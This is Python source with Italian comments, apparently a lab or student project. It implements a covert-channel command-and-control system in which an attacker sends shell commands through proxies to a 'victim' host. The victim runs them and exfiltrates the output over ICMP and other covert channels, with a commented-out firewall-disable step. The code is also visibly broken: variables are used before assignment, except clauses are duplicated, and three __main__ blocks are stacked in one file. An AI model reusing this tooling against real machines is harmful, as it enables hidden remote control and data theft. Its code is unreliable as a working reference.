from type.check_type import is_namespace, is_ipaddress, is_integer, is_enum_member, is_boolean, is_string, is_list, is_bytes, is_socket
from type.get_type import get_threading_Lock
from network.network_methods import firewall_disable, firewall_enable, insert_ip_host, find_local_IP
from network.network_classes import HOST_CONNESSI
from utils_methods import ask_bool_choice
from thread_methods import THREAD_VICTIM, THREAD_PROXY, THREAD_ATTACCANTE
from classes import EXCEUTE_COMMAND, ARGS_CONFIG, DATA
from config import default_file_path, localhost, attacker_mode, type_sender, use_delay
from custom_enum import ENTITY, ATTACK_TYPE, MSG, SENDER_TYPE, EXIT_CASES, SEPARAZIONE_DATI
from attack.singleton import SendSingleton, ReceiveSingleton
from attack.attack_classes import _IPx
from scapy.all import random
import ipaddress, os, json, socket, threading

class Victim:  
    def __init__(self,num_proxy:int=None): 
        self.ip_host=insert_ip_host() 
        print("IP della macchina:", self.ip_host) 
        if not is_ipaddress(self.ip_host): 
            raise TypeError("ip_host non valido")  
        if not is_integer(num_proxy) or num_proxy<=0: 
            raise Exception("Numero connessioni non valido:",num_proxy)
        self.num_proxy=num_proxy 
        print("Connessioni necessarie:",self.num_proxy) 
        self.connected_hosts=HOST_CONNESSI() 
    
    def start(self): 
        try: 
            #firewall_disable() #TODO decommentare 
            print("Waiting connections...")  
            wait_connections=THREAD_VICTIM.WAIT_CONNECTIONS(
                self, self.num_proxy, self.connected_hosts
            ) 
            wait_connections.start(self.ip_host)  
            print("Proxy disponiili:",len(self.connected_hosts.host_list)) 
            print("Attacchi scelti:",len(self.connected_hosts.type_attack)) 
            with self.connected_hosts.lock:
                num_host=len(self.connected_hosts.host_list) 
            if num_host<=0: 
                print("Lista proxy vuota") 
                raise SystemError("Interruzione del programma...")  
            if num_host<self.num_proxy: 
                msg="Non sono stati trovati abbastanza proxy\nUtilizzare quelli trovati? [si/no]" 
                scelta=ask_bool_choice(msg)  
                if not scelta: 
                    print("Si è scelto di non continuare") 
                    raise SystemError("Interruzione del programma...")  
                print("Continuo con i proxy trovati...")    
            else: print("Si sono conessi abbastanza proxy...") 
            wait_comand=THREAD_VICTIM.WAIT_COMMAND()
            while True: 
                try: 
                    wait_comand.start() 
                    data=EXCEUTE_COMMAND(wait_comand.comando).data
                    print("Command executed...") 
                    THREAD_VICTIM.SEND_DATA(self, data) 
                    print("Finished sending data...") 
                except Exception as e: 
                    print(e)
                    break
            print("Closing connection")
        except Exception as e:
            print(e)
            firewall_enable()
            exit(1) 
        finally: 
            firewall_enable() 

class Proxy:  
    def __init__(self, ip_attaccante:ipaddress.IPv4Address=None, proxy_port:int=None ): 
        def get_ip_host(): 
            ip_host, errore=find_local_IP() 
            if errore:
                print("errore:",errore)  
                msg="Inserire indirizzo IP dell'host:\n\t#" 
                try: 
                    ip_host=ipaddress.ip_address(input(msg)) 
                except Exception as e: 
                    print(e) 
                    return None
            try: 
                #TODO eliminare alla fine
                #self.ip_host=ipaddress.ip_address("192.168.56.104") 
                ip_host=ipaddress.ip_address(ip_host) 
            except Exception as e: 
                print(e) 
                return None
            print(f"ip_host: {type(ip_host)} {ip_host}") 
            return ip_host
        def attacker_mode(): 
            config_file=None 
            if not os.path.exists(default_file_path) or not str(default_file_path).endswith(".json"):
                raise FileNotFoundError(f"Il file {default_file_path} non esiste") 
            with open(default_file_path, 'r') as file: 
                print(f"File di configurazione {default_file_path} caricato correttamente") 
                config_file= json.load(file) 
            self.attack_function=ATTACK_TYPE.get_attack_method(config_file.get("attack_function"))
            if not is_enum_member(self.attack_function,ATTACK_TYPE): 
                self.attack_function=ATTACK_TYPE.choose_attack_function() 
            print(f"ATTACCO:",self.attack_function) 
            self.ip_vittima = ipaddress.ip_address(config_file.get("ip_vittima", None))   
            if not is_ipaddress(self.ip_vittima):
                raise TypeError("ip_vittima non valido") 
            print(f"IP VITTIMA",self.ip_vittima) 
        #-------------------------- 
        self.ip_host:ipaddress.IPv4Address=None 
        while not is_ipaddress(self.ip_host): 
            self.ip_host=get_ip_host() 
        print(f"IP HOST",self.ip_host) 
        self.socket_attacker:socket=None #tuple[socket, _RetAddress]  
        if not is_ipaddress(ip_attaccante): 
            raise TypeError("Indirizzo IP attaccante non valido")  
        self.ip_attaccante:ipaddress.IPv4Address=ip_attaccante
        if self.ip_attaccante.compressed==localhost: 
            self.ip_attaccante=self.ip_host 
        print(f"IP ATTACCANTE: {self.ip_attaccante}") 
        if not is_integer(proxy_port): 
            raise TypeError("Porta non valida") 
        self.proxy_port=proxy_port  
        self.ip_vittima:ipaddress.IPv4Address=None  
        self.exfiltred_data:list=[] 
        self.attack_function:ATTACK_TYPE=None 
        if attacker_mode: 
            return attacker_mode() 
    
    def start(self): 
        def connessione_attaccante():  
            #--------------------------------
            #with self.socket_attacker: 
            #socket.create_server(addr, family=socket.AF_INET6, dualstack_ipv6=True) #socket 4 both ipv4 and ipv6 
            while True: 
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: 
                    print(f"Server listening: {s}")  
                    #s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
                    s.bind(
                        (self.ip_host.compressed, self.proxy_port)
                        #("192.168.56.104", 4567) 
                        #(socket.gethostname(), 4567)
                    ) 
                    s.listen(1) 
                    accepted_socket,accepted_addr=s.accept() 
                    #accepted_addr=ipaddress.ip_address(accepted_addr)
                    if accepted_addr==self.ip_attaccante.compressed: 
                        print("Stabilita connessione con attaccante: ", accepted_addr) 
                        self.socket_attacker=accepted_socket 
                        break
                    accepted_socket.close() 
            print("SOCKET",accepted_socket) 
            data_received=""
            while True:
                self.socket_attacker.settimeout(10) 
                chunk=self.socket_attacker.recv(1024).decode() 
                if not chunk: break
                data_received+=chunk
                if MSG.END_SOCKETSEND.value in data_received: 
                    data_received=data_received.replace(MSG.END_SOCKETSEND.value,"")
                    break  
            if MSG.CONFIRM_ATTACKER.value not in data_received: 
                peer = self.socket_attacker.getpeername() #self.socket_attacker[0]
                self.socket_attacker.close()  
                raise ValueError(f"Invalid data from {peer}:\t{data_received}")  
            print("Dati ricevuti: ", data_received) 
            if MSG.CONFIRM_ATTACKER.value not in data: 
                raise ValueError("Il messagigo non contiene l'indirizzo IP della vittima:",data_received) 
            if not MSG.ATTACK_FUNCTION.value in data: 
                raise ValueError("Il messagigo non contiene la tipologia di attacco utilizzato:",data_received) 
            for data in data_received.split("||"):
                if MSG.CONFIRM_ATTACKER.value in data: 
                    self.ip_vittima=ipaddress.ip_address(
                        data.replace(MSG.CONFIRM_ATTACKER.value,"") 
                    )
                    print(f"IP vittima: {type(self.ip_vittima)} : {self.ip_vittima}")
                elif MSG.ATTACK_FUNCTION.value in data:  
                    self.attack_function=ATTACK_TYPE.get_attack_method(
                        data.replace(MSG.ATTACK_FUNCTION.value,"").strip()
                    )
                    print(f"Func attacco: {type(self.attack_function)} : {self.attack_function}") 
                else: print("UNKNOWN DATA",data) 
            data=(MSG.CONFIRM_PROXY.value+
                self.ip_vittima.compressed+
                self.ip_host.compressed
                )
            self.socket_attacker.sendall(data.encode()) 
        def connessione_vittima(): 
            thread_victim_connection=THREAD_PROXY.VICTIM_CONNECTION()
            thread_victim_connection.start(self.ip_vittima, self.ip_host) 
            if not is_enum_member(self.attack_function,ATTACK_TYPE): 
                raise TypeError("attack_function non valida")  
            #int_version=self.attack_function.name.replace("ipv","").split("_")[0]  
            #int_code=self.attack_function.value  
            #XORversion= ord("i") ^ int(int_version) 
            #XORcode= ord("p") ^ int(int_code)  
            #icmp_id=(XORversion<<8)+XORcode  
            confirm_text=(
                MSG.CONFIRM_PROXY.value+
                self.ip_vittima.compressed+
                self.attack_function.name 
            ) 
            SendSingleton(
                ATTACK_TYPE.ipv4_echo_payload, 
                SENDER_TYPE.TRUE_SENDER, 
                False 
            ).send_data(confirm_text.encode(), self.ip_vittima) 
            print("Confirm sent to victim...") 
            print("Waiting thread to end...") 
            with thread_victim_connection.lock: 
                response=thread_victim_connection.response
            print("Thread has been executed...") 
            if is_boolean(response): 
                print("Aggiorno attaccante...")
                update_attaccante(response)  
            if response: 
                print("Received confirm from victim...") 
            else: raise RuntimeError("Conferma non arrivata dalla vittima") 
        def update_attaccante(result:bool): 
            #AGGIORNO ATTACCANTE SU CONNESISONE CON VITTIMA
            if attacker_mode: 
                print("ATACKER_MODE->update_attaccante")
                return
            if not is_boolean(result): 
                raise TypeError("result non booleano") 
            if not is_ipaddress(self.ip_vittima): 
                raise TypeError("ip_vittima non valido") 
            if not is_ipaddress(self.ip_host): 
                raise TypeError("ip_host non valido") 
            if not isinstance(self.socket_attacker,socket): 
                if attacker_mode: 
                    print("ATTACKER MODE -> socket_attacker")
                else: raise TypeError("socket_attacker non valido") 
            data=(
                MSG.CONFIRM_VICTIM.value+
                self.ip_vittima.compressed+
                self.ip_host.compressed+
                str(result) 
            )  
            if attacker_mode: 
                print("ATTACKER MODE -> SendSingleton")
                SendSingleton(
                    ATTACK_TYPE.ipv4_echo_payload, 
                    SENDER_TYPE.TRUE_SENDER, 
                    False 
                ).send_data(data.encode(), self.ip_host) 
            else: self.socket_attacker.sendall(data.encode())  
            print(f"Aggiornamento confermato all'attaccante")
            if not result:
                self.socket_attacker.close()
                raise SystemError("NON CONNESSO ALLA VITITMA",self.ip_vittima) 
            print("CONNESSO A",self.ip_vittima)  
        def end_communication_wth_victim():
            if not is_ipaddress(self.ip_vittima):
                raise Exception(f"ip_vittima non validi ipaddress") 
            data=MSG.END_COMMUNICATION.value
            #SNIFFER.send_packet(data.encode(),ip_dst=ip_vittima) 
            SendSingleton(
                self.attack_function, 
                type_sender, 
                use_delay 
            ).send_data(data.encode(), self.ip_vittima) 
            print("VITTIMA AGGIORNATA") 
        def comando_from_attaccante():   
            received_command=""
            while True: 
                if attacker_mode: 
                    msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
                    command=input(msg)  
                    received_command=MSG.CONFIRM_COMMAND.value+command  
                    break 
                self.socket_attacker.settimeout(10) 
                chunk=self.socket_attacker.recv(1024).decode() 
                if not chunk: continue
                received_command+=chunk
                if MSG.END_SOCKETSEND.value in received_command: 
                    received_command=received_command.replace(MSG.END_SOCKETSEND.value,"")
                    break  
            if not is_string(received_command) or ([MSG.CONFIRM_COMMAND.value,MSG.WAIT_DATA.value] not in received_command):
                raise ValueError("Comando non valido:",received_command) 
            if any(case in received_command for case in [e.value for e in EXIT_CASES]): 
                raise ValueError("received_command in exit_cases",received_command) 
            print("Received command:", received_command) 
            #data=wait_class.wait().data
            integer=0
            if MSG.CONFIRM_COMMAND.value in received_command: 
                integer+=1
            if MSG.WAIT_DATA.value in command:
                integer+=2 
            match integer:
                case 1: 
                    command= received_command.replace(MSG.CONFIRM_COMMAND.value,"").strip() 
                    print("COMANDO",command) 
                    SendSingleton(
                        self.attack_function, 
                        type_sender, 
                        use_delay 
                    ).send_data(command.encode(), self.ip_vittima) 
                case 2: 
                    print("Aspetto i dati dalla vittima") 
                case _: 
                    raise ValueError(f"Caso non contemplato:",integer,"\n",received_command) 
            print(f"Aspetto che {self.ip_vittima} mandi i dati con il Covert Channel {self.attack_function.name} ") 
        def inoltra_dati(): 
            if not is_list(self.exfiltred_data) or len(self.exfiltred_data)<=0: 
                print("Nessun dato ricevuto") 
                self.socket_attacker.sendall(MSG.LAST_PACKET.value.encode()) if not attacker_mode else None
                raise Exception(f"Lista dati esfiltrati non valida:",type(self.exfiltred_data),self.exfiltred_data)  
            if attacker_mode: 
                return 
            for data in self.exfiltred_data:
                try: 
                    print("Inoltro:",data)  
                    if not is_bytes(data): 
                        data=bytes(data) 
                    self.socket_attacker.sendall(data) 
                except Exception as e: 
                    print("Conversione non riuscita",e)  
                except Exception as e:
                    print("Invio dati non riuscito",e) 
            self.socket_attacker.sendall(MSG.LAST_PACKET.value.encode())
        #--------------------------- 
        try:
            #firewall_disable() 
            print("Controllo connesisone con attaccante")
            connessione_attaccante() 
            if not is_socket(self.socket_attacker) and not attacker_mode: 
                raise TypeError("socket non valido",self.socket_attacker)
            print("Connessione con attaccante stabilita") 
            print("Controllo connessione con vittima")
            connessione_vittima() 
            print("Waiting command from attacker...") 
            wait_class=ReceiveSingleton(self.attack_function).wait_class 
            if not isinstance(wait_class, _IPx):  
                raise TypeError("wait_class non _IPx",type(wait_class)) 
            thread_data=threading.Thread(target= lambda: wait_class.wait() ) 
            while True: 
                thread_data.start()
                try: 
                    comando_from_attaccante()
                except Exception as e:
                    print(e)
                    break 
                if thread_data.ident is not None:
                    thread_data.join() 
                self.exfiltred_data=wait_class.data 
                print("DATA RECEIVED:",self.exfiltred_data)
                inoltra_dati() 
                #reset()
            print("Interruzione programma") 
            end_communication_wth_victim() 
            self.socket_attacker.close()  if not attacker_mode else None
        except Exception as e: 
            print(e) 
        finally: 
            pass 
            #firewall_enable() 

class Attacker: 
    def __init__(self, config_args:ARGS_CONFIG.FROM_FILE): 
        if not isinstance(config_args, ARGS_CONFIG.FROM_FILE):
            raise TypeError("config_args non valido")
        self.ip_vittima=config_args.ip_vittima 
        self.ip_host=config_args.ip_host 
        self.attack_type=config_args.attack_type 
        self.lock_proxy_list:threading.Lock=get_threading_Lock() 
        self.proxy_list:dict[str,DATA.PROXY]=dict() 
        for proxy in config_args.proxy_list : 
            if not is_ipaddress(proxy): 
                #proxy_list.remove(proxy) 
                print(f"\t{proxy} non è un indirizzo valido") 
                continue 
            if not self.proxy_list.get(proxy.compressed): 
                self.proxy_list[proxy.compressed]=DATA.PROXY(proxy,self.proxy_port) 
        self.proxy_port=config_args.proxy_port 
        self.dati_ricevuti={} 
    
    def start(self): 
        def send_command(): 
            chosen_proxy=random.choice(self.proxy_list.values()) 
            if not isinstance(chosen_proxy, DATA.PROXY): 
                raise TypeError("Proxy non DATA.PROXY") 
            print(f"Il comando verrà mandato al proxy {chosen_proxy}") 
            with self.lock_proxy_list: 
                socket= self.proxy_list[chosen_proxy.ipaddress.compressed].socket
            messaggio=(
                MSG.CONFIRM_COMMAND.value+
                command+
                MSG.END_SOCKETSEND.value
            )
            socket.sendall(messaggio.encode()) 
            print(f"Gli altri proxy ascolteranno direttamente la vittima")
            for proxy in self.proxy_list.values(): 
                if proxy.ipaddress.compressed==chosen_proxy.ipaddress.compressed:
                    continue 
                with self.lock_proxy_list:
                    socket= self.proxy_list[proxy.ipaddress.compressed].socket
                socket.sendall(MSG.WAIT_DATA.value.encode())  
        def get_received_data(): 
            received_data=[]
            with self.lock_proxy_list: 
                for proxy in self.proxy_list.values(): 
                    with proxy.data_lock: 
                        received_data.extend(proxy.data_received) 
            return received_data 
        def reset_variables(): 
            self.thread_list={}
            self.dati_separati={}
            #self.data_received:dict[str,list]={}
            for proxy in self.proxy_list: 
                if not isinstance(proxy, ipaddress.IPv4Address) and not isinstance(proxy, ipaddress.IPv6Address):
                    print(f"***\t{proxy} non è un indirizzo valido")
                    continue
                self.data_received.update({proxy.compressed:[]}) 
                thread=threading.Thread(
                    target=self.wait_data_from_proxy 
                    ,args=[proxy]
                )
                thread.name=f"Thread-{proxy.compressed}"
                self.thread_list.update({proxy.compressed:thread})
            for proxy in self.proxy_list:
                self.event_thread_update.get(proxy.compressed).clear() 
            for thread in self.thread_list.values():
                thread.start() 
            #if want_to_choose_new_attack():
            #    self.attack_function=choose_new_attack() 
            #if want_to_choose_new_victim:
            #   self.ip_vittima= choose_new_victim()  
        #------------------------ 
        self.thread_proxiesConnection=THREAD_ATTACCANTE.PROXIES_CONECTION(self.proxy_list, self.proxy_port, self.lock_proxy_list) 
        self.thread_proxiesConnection.start(
            self.ip_vittima,self.attack_type
        )  
        print(f"Got all connected proxy") 
        if len(self.proxy_list)<=0: 
            print("Nessun Proxy disponibile")
            exit(0) 
        self.thread_waitData=THREAD_ATTACCANTE.WAIT_DATA(self.proxy_list) 
        self.thread_waitData.start(self.proxy_list) 
        msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
        command=input(msg) 
        while command.lower() not in [e.value for e in EXIT_CASES]: 
            print(f"Il comando immesso è: {command}") 
            try: 
                send_command() 
                print("Attesa dei dati dai proxy...") 
                for thread in self.thread_waitData.values(): 
                    thread.join() 
                print("Tutti i dati ricevuti dai proxy") 
                self.data_received=get_received_data() 
                print("Dati ricevuti: ",self.data_received) 
                self.dati_separati= DATA.METHODS.separa_dati(SEPARAZIONE_DATI.ID, self.data_received) 
                print("Dati separati: ",self.dati_separati) 
                #print("\n***dati_separati: ", self.dati_separati) 
                print("Dati separati per Sequenza")    
                payload=DATA.METHODS.unisci_dati(self.dati_separati)
                print(payload) 
                #reset thread and reset data_received
                reset_variables()
                command=input(msg) 
            except Exception as e: 
                print(e) 
                exit(-1)
        print("Uscita dalla shell\texit")  
        for proxy in self.proxy_list.values(): 
            with self.lock_proxy_list:
                socket_proxy=self.proxy_list.get(proxy.compressed).socket 
            try: 
                socket_proxy.sendall(MSG.END_COMMUNICATION.value.encode()) 
                socket_proxy.close() 
            except Exception as e: 
                print(f"send_command_to_victim-> ",e)
                print(f"Errore durante la chiusura della connessione con proxy {proxy}")


if __name__=="__main__": 
    args=ARGS_CONFIG.FROM_COMMAND(ENTITY.ATTACKER).args
    if not is_namespace(args): 
        exit(-1) 
    if not is_string(args.file_path):
        config_args=ARGS_CONFIG.FROM_FILE(args.file_path) 
    else: config_args=ARGS_CONFIG.FROM_FILE(None) 
    attacker=Attacker(config_args) 
    attacker.start()

if __name__=="__main__": 
    args=ARGS_CONFIG.FROM_COMMAND(ENTITY.PROXY) 
    if not is_namespace(args): 
        exit(-1) 
    if int(args.proxy_port): 
        proxy_port=args.proxy_port
    if not is_string(args.ip_attaccante): 
        raise ValueError("IP attaccante non specificato") 
    ip_attaccante=None
    if args.ip_attaccante=="SELF": 
        attacker_mode=True
        ip_attaccante=ipaddress.ip_address(localhost)
    else: 
        attacker_mode=False
        ip_attaccante=ipaddress.ip_address(args.ip_attaccante)
    proxy=Proxy(ip_attaccante, proxy_port) 
    proxy.start()

if __name__ == "__main__": 
    args=ARGS_CONFIG.FROM_COMMAND(ENTITY.VICTIM).args 
    if not is_namespace(args): 
        exit(-1) 
    if not is_string(args.file_path):
        config_args=ARGS_CONFIG.FROM_FILE(args.file_path) 
    else: config_args=ARGS_CONFIG.FROM_FILE(None) 
    vittima=Victim(config_args.num_proxy ) 
    vittima.start()

